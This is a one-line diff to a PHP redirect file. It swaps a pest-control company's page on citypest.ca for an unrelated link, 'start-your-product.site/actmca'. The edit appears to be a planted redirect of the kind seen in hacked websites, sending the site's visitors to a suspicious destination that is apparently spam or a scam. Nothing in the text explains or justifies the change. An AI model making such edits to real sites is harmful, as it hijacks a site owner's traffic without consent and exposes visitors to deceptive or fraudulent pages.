@@ -1,4 +1,4 @@
 <?php
-header("Location: https://citypest.ca/Cockroach-Control.html");
+header("Location: https://start-your-product.site/actmca");
 die();
 ?>
